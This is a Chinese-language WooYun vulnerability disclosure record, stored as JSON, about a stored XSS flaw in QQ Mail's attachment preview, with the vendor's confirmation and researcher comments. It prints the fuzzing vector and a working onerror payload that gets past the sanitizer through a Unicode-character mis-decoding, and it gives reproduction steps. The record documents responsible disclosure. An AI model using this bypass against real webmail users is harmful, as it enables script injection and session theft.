{"id": 74315, "wybug_id": "wooyun-2016-0169137", "wybug_title": "腾讯邮箱存储型XSS漏洞2(浏览器通用)", "wybug_corp": "腾讯", "wybug_author": "mramydnei", "wybug_date": "2016-01-11 16:33", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： 还是fuzz,不过这次是<img src=x onerror=alert(1)> 详细说明：  使用QQ邮箱对部分附件（htm,html等）进行预览时，部分特殊unicode字符可导致防御xss的机制被绕过。一般情况下，QQ邮箱不会过滤\n1.未知attribute及其value2.如果event handler(onxxx)出现在tag之外也是不会去管\n基于上面的理论，我们可以构造下面的测试vector:\n<img src=\"http://dm3.in/test.png\" x=\"[U+000000,U+10FFFF]\"> onerror=alert(1) <br>\n每2万个vector一组（存储到同一个htm文件），也就只有30多个htm文件。实际测试当中，测试到第二个文件的时候防御机制就被pwn掉了。原始内容：\n%E4%B9%80 <img src=\"http://dm3/in/test.png\" x=\"乀\"> onerror=alert(document.domain) <br>\n预览时的内容：\n%E4%B9%80 <img src=\"http://dm3/in/test.png\" x=\"涔€\" onerror=\"alert(document.domain)\" <br=\"\">\n   漏洞证明：  将下面的文件添加到附加中，发送给自己。然后对附件进行预览即可。\nhttp://dm3.in/tools/infuzz/result.htm\n相关截图：\n\nps:会导致上述情况发生的不单是U+4E40   修复方案：  不看代码还真不好说   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-01-12 16:11 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-12 16:21 |    \t\t风情万种 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:65        | 不再相信爱了)\t\t \n  前排 卖妹子    \n     2016-01-12 16:59 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1074 漏洞数:182        | px1624)\t\t \n  你这样断了多少人的财路啊？注意你的人身安全，呵呵    \n     2016-01-12 17:05 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:527 漏洞数:119        | )\t\t \n  腾讯确认真是快，开挂了    \n     2016-01-12 17:23 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:230 漏洞数:30        | 是金子总会发光，在还未发光之前，先磨磨)\t\t \n  厉害啊，fuzz是利用程序批量修改内容给自己发信？    \n     2016-01-12 17:53 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:388 漏洞数:85        | 一个逗逼运维)\t\t \n  @px1624 要杀到日本我也认了。再说这个别人不一定挖到过还是公开后看详情吧    \n     2016-01-12 18:52 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:46        | ค้้้้้้้้้)\t\t \n  前排    \n     2016-01-12 18:54 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:244 漏洞数:65        | 天之屌，人之神！天人合一，乃屌神也！)\t\t \n  后排唠嗑    \n     2016-01-12 18:55 |    \t\tphith0n  \t\t\t( 普通白帽子  |\t\t\t        Rank:743 漏洞数:117        | 一个想当文人的黑客~)\t\t \n  @px1624 看来挡了px嘿铲牛的财路    \n     2016-01-12 19:16 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  @phith0n 哈哈哈哈 PH牛瞎说什么大实话    \n     2016-01-12 22:09 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:85 漏洞数:23        | 有事请发邮件，2859857@gmail.com，垃圾邮...)\t\t \n  @phith0n 给大牛请安    \n     2016-01-13 08:41 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1074 漏洞数:182        | px1624)\t\t \n  @phith0n 和我没啥关系    \n     2016-02-01 17:05 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1074 漏洞数:182        | px1624)\t\t \n  膜拜m牛这种暴力测试方法！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}